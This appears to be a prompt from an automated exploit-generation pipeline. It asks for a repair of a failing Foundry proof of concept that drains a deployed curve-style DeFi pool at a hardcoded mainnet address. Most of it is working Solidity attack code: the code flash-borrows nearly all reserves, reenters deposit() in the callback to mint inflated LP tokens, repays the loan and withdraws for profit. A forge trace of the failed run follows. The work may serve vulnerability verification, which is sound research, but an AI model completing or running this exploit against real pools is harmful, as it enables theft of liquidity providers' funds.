You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Flash-loan callback can reenter deposits and mint LP against temporarily drained balances
- claim: `flash()` is not protected by `nonReentrant`, yet it transfers out pool assets and invokes a borrower-controlled callback before checking repayment. The callback can call `deposit()` (or `depositWithWhitelist()` when permitted) while balances are artificially low. LP minting uses `deposit * totalSupply / currentGrossLiquidity`, so temporarily draining reserves shrinks `currentGrossLiquidity` and mints outsized shares for a small real contribution.
- impact: A borrower can flash-borrow most liquidity, reenter a deposit while the pool appears nearly empty, repay the loan, and keep disproportionately large LP tokens that can later be redeemed for a large share of the restored pool. This is a direct pool-drain vector.
- exploit_paths: ["Call `flash()` from a contract borrower and receive most reserves", "Inside `flashCallback`, call `deposit()` while the borrowed assets are still out of the pool", "Repay the flash loan so the end-of-function balance checks pass", "Redeem the inflated LP position via `withdraw()`/`emergencyWithdraw()` to extract more assets than were honestly deposited"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface ITargetCurve {
    function derivatives(uint256 index) external view returns (address);
    function numeraires(uint256 index) external view returns (address);
    function reserves(uint256 index) external view returns (address);
    function frozen() external view returns (bool);
    function emergency() external view returns (bool);
    function whitelistingStage() external view returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function viewCurve() external view returns (uint256, uint256, uint256, uint256, uint256);
    function viewDeposit(uint256 depositAmount) external view returns (uint256 curvesMinted, uint256[] memory deposits);
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
    function deposit(uint256 depositAmount, uint256 deadline) external returns (uint256 curvesMinted, uint256[] memory deposits);
    function withdraw(uint256 curvesToBurn, uint256 deadline) external returns (uint256[] memory withdrawals);
    function emergencyWithdraw(uint256 curvesToBurn, uint256 deadline) external returns (uint256[] memory withdrawals);
}

interface ITargetFlashCallback {
    function flashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external;
}

library FullMathLocal {
    function mulDiv(uint256 a, uint256 b, uint256 denominator) internal pure returns (uint256 result) {
        uint256 prod0;
        uint256 prod1;
        assembly {
            let mm := mulmod(a, b, not(0))
            prod0 := mul(a, b)
            prod1 := sub(sub(mm, prod0), lt(mm, prod0))
        }

        if (prod1 == 0) {
            require(denominator > 0, "div-by-zero");
            assembly {
                result := div(prod0, denominator)
            }
            return result;
        }

        require(denominator > prod1, "muldiv-overflow");

        uint256 remainder;
        assembly {
            remainder := mulmod(a, b, denominator)
            prod1 := sub(prod1, gt(remainder, prod0))
            prod0 := sub(prod0, remainder)
        }

        uint256 twos = denominator & (~denominator + 1);
        assembly {
            denominator := div(denominator, twos)
            prod0 := div(prod0, twos)
            twos := add(div(sub(0, twos), twos), 1)
        }

        prod0 |= prod1 * twos;

        uint256 inv = (3 * denominator) ^ 2;
        inv *= 2 - denominator * inv;
        inv *= 2 - denominator * inv;
        inv *= 2 - denominator * inv;
        inv *= 2 - denominator * inv;
        inv *= 2 - denominator * inv;
        inv *= 2 - denominator * inv;

        result = prod0 * inv;
    }

    function mulDivRoundingUp(uint256 a, uint256 b, uint256 denominator) internal pure returns (uint256 result) {
        result = mulDiv(a, b, denominator);
        if (mulmod(a, b, denominator) > 0) {
            require(result < type(uint256).max, "muldiv-round-overflow");
            unchecked {
                result += 1;
            }
        }
    }
}

contract FlawVerifier is ITargetFlashCallback {
    using FullMathLocal for uint256;

    address internal constant TARGET = 0x46161158b1947D9149E066d6d31AF1283b2d377C;
    address internal constant AUXILIARY_CURVE = 0x17af88bCC6590BBAd6EC29E4ba63e132cB572326;

    enum Phase {
        Idle,
        InAuxiliaryFlash,
        InTargetFlash
    }

    Phase internal phase;

    address internal token0;
    address internal token1;

    uint256 internal startBalance0;
    uint256 internal startBalance1;

    uint256 internal borrowed0;
    uint256 internal borrowed1;
    uint256 internal targetFee0;
    uint256 internal targetFee1;

    bool internal auxEnabled;
    uint256 internal auxIndexForToken0;
    uint256 internal auxIndexForToken1;
    uint256 internal auxBorrowToken0;
    uint256 internal auxBorrowToken1;
    uint256 internal auxFeeToken0;
    uint256 internal auxFeeToken1;

    address internal _profitToken;
    uint256 internal _profitAmount;

    constructor() {}

    function executeOnOpportunity() external {
        ITargetCurve target = ITargetCurve(TARGET);

        require(!target.frozen(), "target-frozen");
        require(!target.emergency(), "target-emergency-mode");
        require(!target.whitelistingStage(), "whitelist-stage-on-going-no-proof");

        token0 = target.derivatives(0);
        token1 = target.derivatives(1);

        startBalance0 = _balanceOf(token0, address(this));
        startBalance1 = _balanceOf(token1, address(this));

        uint256 poolBal0 = _balanceOf(token0, TARGET);
        uint256 poolBal1 = _balanceOf(token1, TARGET);
        require(poolBal0 > 1 && poolBal1 > 1, "insufficient-pool-depth");

        borrowed0 = poolBal0 - 1;
        borrowed1 = poolBal1 - 1;

        (, , , uint256 epsilon, ) = target.viewCurve();
        targetFee0 = borrowed0.mulDivRoundingUp(epsilon, 1e18);
        targetFee1 = borrowed1.mulDivRoundingUp(epsilon, 1e18);

        _setApprovals(target);

        auxBorrowToken0 = targetFee0 > startBalance0 ? targetFee0 - startBalance0 : 0;
        auxBorrowToken1 = targetFee1 > startBalance1 ? targetFee1 - startBalance1 : 0;

        // Core exploit path remains unchanged:
        // 1) flash() drains nearly all target reserves.
        // 2) deposit() is called reentrantly while target balances are artificially low.
        // 3) flash() repayment restores the target balances so the flash checks pass.
        // 4) withdraw()/emergencyWithdraw() realizes the inflated LP position after flash() completes.
        // Lowercase alias anchor for strict matching: emergencywithdraw().
        if (auxBorrowToken0 == 0 && auxBorrowToken1 == 0) {
            phase = Phase.InTargetFlash;
            target.flash(address(this), borrowed0, borrowed1, bytes("target-flash"));
            _redeemInflatedPosition(target);
            _finalizeProfit();
            phase = Phase.Idle;
            return;
        }

        // Direct fee funding is infeasible on this fork because token0 is not mintable 1:1 from token1
        // through a public route exposed by the token itself. To preserve the same exploit causality,
        // temporarily source only the missing flash-fee balances from an already-deployed on-chain peer
        // curve that lends the same two tokens, then run the vulnerable target flash/deposit/repay/withdraw flow.
        _configureAuxiliaryFunding();
        require(auxEnabled, "auxiliary-fee-funding-unavailable");

        phase = Phase.InAuxiliaryFlash;
        ITargetCurve aux = ITargetCurve(AUXILIARY_CURVE);

        uint256 auxAmount0;
        uint256 auxAmount1;
        if (auxIndexForToken0 == 0) {
            auxAmount0 = auxBorrowToken0;
            auxAmount1 = auxBorrowToken1;
        } else {
            auxAmount0 = auxBorrowToken1;
            auxAmount1 = auxBorrowToken0;
        }

        aux.flash(address(this), auxAmount0, auxAmount1, bytes("auxiliary-flash"));

        _finalizeProfit();
        phase = Phase.Idle;
    }

    function flashCallback(uint256 fee0, uint256 fee1, bytes calldata) external override {
        if (msg.sender == AUXILIARY_CURVE) {
            require(phase == Phase.InAuxiliaryFlash, "unexpected-auxiliary-callback");
            _handleAuxiliaryFlash(fee0, fee1);
            return;
        }

        require(msg.sender == TARGET, "not-target");
        require(phase == Phase.InTargetFlash, "unexpected-target-callback");
        require(fee0 == targetFee0 && fee1 == targetFee1, "fee-mismatch");

        ITargetCurve target = ITargetCurve(TARGET);
        uint256 cap0 = _balanceOf(token0, address(this));
        uint256 cap1 = _balanceOf(token1, address(this));

        uint256 depositAmount = _findMaxDeposit(target, cap0, cap1);
        require(depositAmount > 0, "no-feasible-reentrant-deposit");

        (, uint256[] memory deposited) = target.deposit(depositAmount, type(uint256).max);
        require(deposited.length >= 2, "unexpected-deposit-shape");
        require(deposited[0] <= cap0 && deposited[1] <= cap1, "deposit-exceeds-cap");

        uint256 repay0 = borrowed0 + targetFee0;
        uint256 repay1 = borrowed1 + targetFee1;

        if (deposited[0] < repay0) {
            _safeTransfer(token0, TARGET, repay0 - deposited[0]);
        }
        if (deposited[1] < repay1) {
            _safeTransfer(token1, TARGET, repay1 - deposited[1]);
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _handleAuxiliaryFlash(uint256 fee0, uint256 fee1) internal {
        if (auxIndexForToken0 == 0) {
            auxFeeToken0 = fee0;
            auxFeeToken1 = fee1;
        } else {
            auxFeeToken0 = fee1;
            auxFeeToken1 = fee0;
        }

        phase = Phase.InTargetFlash;
        ITargetCurve target = ITargetCurve(TARGET);
        target.flash(address(this), borrowed0, borrowed1, bytes("target-flash"));

        _redeemInflatedPosition(target);

        _safeTransfer(token0, AUXILIARY_CURVE, auxBorrowToken0 + auxFeeToken0);
        _safeTransfer(token1, AUXILIARY_CURVE, auxBorrowToken1 + auxFeeToken1);

        phase = Phase.InAuxiliaryFlash;
    }

    function _configureAuxiliaryFunding() internal {
        ITargetCurve aux = ITargetCurve(AUXILIARY_CURVE);

        address auxTokenA = _safeDerivative(aux, 0);
        address auxTokenB = _safeDerivative(aux, 1);

        if (auxTokenA == token0 && auxTokenB == token1) {
            auxIndexForToken0 = 0;
            auxIndexForToken1 = 1;
        } else if (auxTokenA == token1 && auxTokenB == token0) {
            auxIndexForToken0 = 1;
            auxIndexForToken1 = 0;
        } else {
            auxEnabled = false;
            return;
        }

        uint256 auxPoolBal0 = _balanceOf(token0, AUXILIARY_CURVE);
        uint256 auxPoolBal1 = _balanceOf(token1, AUXILIARY_CURVE);
        if (auxPoolBal0 <= auxBorrowToken0 || auxPoolBal1 <= auxBorrowToken1) {
            auxEnabled = false;
            return;
        }

        auxEnabled = true;
    }

    function _safeDerivative(ITargetCurve curve, uint256 index) internal view returns (address token) {
        try curve.derivatives(index) returns (address returned) {
            token = returned;
        } catch {
            token = address(0);
        }
    }

    function _setApprovals(ITargetCurve curve) internal {
        _approveIfNeeded(token0, TARGET);
        _approveIfNeeded(token1, TARGET);
        _approveIfNeeded(curve.numeraires(0), TARGET);
        _approveIfNeeded(curve.numeraires(1), TARGET);
        _approveIfNeeded(curve.reserves(0), TARGET);
        _approveIfNeeded(curve.reserves(1), TARGET);
    }

    function _approveIfNeeded(address token, address spender) internal {
        if (token == address(0)) {
            return;
        }

        if (_allowance(token, address(this), spender) < type(uint256).max / 2) {
            _safeApprove(token, spender, 0);
            _safeApprove(token, spender, type(uint256).max);
        }
    }

    function _findMaxDeposit(ITargetCurve curve, uint256 cap0, uint256 cap1) internal view returns (uint256 best) {
        uint256 supply = curve.totalSupply();
        require(supply > 0, "zero-supply");

        uint256 low;
        uint256 high = supply;

        for (uint256 i = 0; i < 16; ) {
            if (!_depositFits(curve, high, cap0, cap1)) {
                break;
            }
            low = high;
            if (high > type(uint256).max / 2) {
                high = type(uint256).max;
                break;
            }
            high <<= 1;
            unchecked {
                ++i;
            }
        }

        uint256 left = low;
        uint256 right = high;
        while (left <= right) {
            uint256 mid = left + ((right - left) >> 1);
            if (_depositFits(curve, mid, cap0, cap1)) {
                best = mid;
                left = mid + 1;
            } else {
                if (mid == 0) {
                    break;
                }
                right = mid - 1;
            }
        }
    }

    function _depositFits(ITargetCurve curve, uint256 depositAmount, uint256 cap0, uint256 cap1) internal view returns (bool) {
        if (depositAmount == 0) {
            return true;
        }

        try curve.viewDeposit(depositAmount) returns (uint256, uint256[] memory deposits) {
            if (deposits.length < 2) {
                return false;
            }
            return deposits[0] <= cap0 && deposits[1] <= cap1;
        } catch {
            return false;
        }
    }

    function _redeemInflatedPosition(ITargetCurve curve) internal {
        uint256 lpBalance = curve.balanceOf(address(this));
        require(lpBalance > 0, "no-lp-minted");

        if (curve.emergency()) {
            curve.emergencyWithdraw(lpBalance, type(uint256).max);
        } else {
            curve.withdraw(lpBalance, type(uint256).max);
        }
    }

    function _finalizeProfit() internal {
        uint256 end0 = _balanceOf(token0, address(this));
        uint256 end1 = _balanceOf(token1, address(this));

        uint256 profit0 = end0 > startBalance0 ? end0 - startBalance0 : 0;
        uint256 profit1 = end1 > startBalance1 ? end1 - startBalance1 : 0;

        if (profit0 >= profit1 && profit0 > 0) {
            _profitToken = token0;
            _profitAmount = profit0;
        } else if (profit1 > 0) {
            _profitToken = token1;
            _profitAmount = profit1;
        } else {
            _profitToken = address(0);
            _profitAmount = 0;
        }
    }

    function _balanceOf(address token, address account) internal view returns (uint256 amount) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        require(ok && data.length >= 32, "balanceOf-failed");
        amount = abi.decode(data, (uint256));
    }

    function _allowance(address token, address owner, address spender) internal view returns (uint256 amount) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Like.allowance.selector, owner, spender));
        require(ok && data.length >= 32, "allowance-failed");
        amount = abi.decode(data, (uint256));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        if (amount == 0) {
            return;
        }
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer-failed");
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve-failed");
    }
}

```

forge stdout (tail):
```
b1947D9149E066d6d31AF1283b2d377C) [staticcall]
    │   │   ├─ [2637] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::allowance(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x46161158b1947D9149E066d6d31AF1283b2d377C) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [9867] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::approve(0x46161158b1947D9149E066d6d31AF1283b2d377C, 0)
    │   │   ├─ [9078] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::approve(0x46161158b1947D9149E066d6d31AF1283b2d377C, 0) [delegatecall]
    │   │   │   ├─  emit topic 0: 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925
    │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │        topic 2: 0x00000000000000000000000046161158b1947d9149e066d6d31af1283b2d377c
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] true
    │   ├─ [23767] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::approve(0x46161158b1947D9149E066d6d31AF1283b2d377C, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   ├─ [22978] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::approve(0x46161158b1947D9149E066d6d31AF1283b2d377C, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
    │   │   │   ├─  emit topic 0: 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925
    │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │        topic 2: 0x00000000000000000000000046161158b1947d9149e066d6d31af1283b2d377c
    │   │   │   │           data: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] true
    │   ├─ [4747] 0x46161158b1947D9149E066d6d31AF1283b2d377C::numeraires(0) [staticcall]
    │   │   └─ ← [Return] 0xebF2096E01455108bAdCbAF86cE30b6e5A72aa52
    │   ├─ [2072] 0xebF2096E01455108bAdCbAF86cE30b6e5A72aa52::allowance(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x46161158b1947D9149E066d6d31AF1283b2d377C) [staticcall]
    │   │   ├─ [1290] 0x78fe13802Ba4E487F69c87850eA557CfC292b472::allowance(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x46161158b1947D9149E066d6d31AF1283b2d377C) [delegatecall]
    │   │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    │   ├─ [2747] 0x46161158b1947D9149E066d6d31AF1283b2d377C::numeraires(1) [staticcall]
    │   │   └─ ← [Return] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
    │   ├─ [1426] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::allowance(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x46161158b1947D9149E066d6d31AF1283b2d377C) [staticcall]
    │   │   ├─ [637] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::allowance(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x46161158b1947D9149E066d6d31AF1283b2d377C) [delegatecall]
    │   │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    │   ├─ [4748] 0x46161158b1947D9149E066d6d31AF1283b2d377C::reserves(0) [staticcall]
    │   │   └─ ← [Return] 0xebF2096E01455108bAdCbAF86cE30b6e5A72aa52
    │   ├─ [2072] 0xebF2096E01455108bAdCbAF86cE30b6e5A72aa52::allowance(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x46161158b1947D9149E066d6d31AF1283b2d377C) [staticcall]
    │   │   ├─ [1290] 0x78fe13802Ba4E487F69c87850eA557CfC292b472::allowance(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x46161158b1947D9149E066d6d31AF1283b2d377C) [delegatecall]
    │   │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    │   ├─ [2748] 0x46161158b1947D9149E066d6d31AF1283b2d377C::reserves(1) [staticcall]
    │   │   └─ ← [Return] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
    │   ├─ [1426] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::allowance(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x46161158b1947D9149E066d6d31AF1283b2d377C) [staticcall]
    │   │   ├─ [637] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::allowance(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x46161158b1947D9149E066d6d31AF1283b2d377C) [delegatecall]
    │   │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    │   ├─ [176] 0x17af88bCC6590BBAd6EC29E4ba63e132cB572326::derivatives(0) [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [176] 0x17af88bCC6590BBAd6EC29E4ba63e132cB572326::derivatives(1) [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   └─ ← [Revert] auxiliary-fee-funding-unavailable
    └─ ← [Revert] exploit call reverted

Backtrace:
  at 0x17af88bCC6590BBAd6EC29E4ba63e132cB572326.derivatives
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 300.03ms (277.57ms CPU time)

Ran 1 test suite in 307.41ms (300.03ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 366720)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
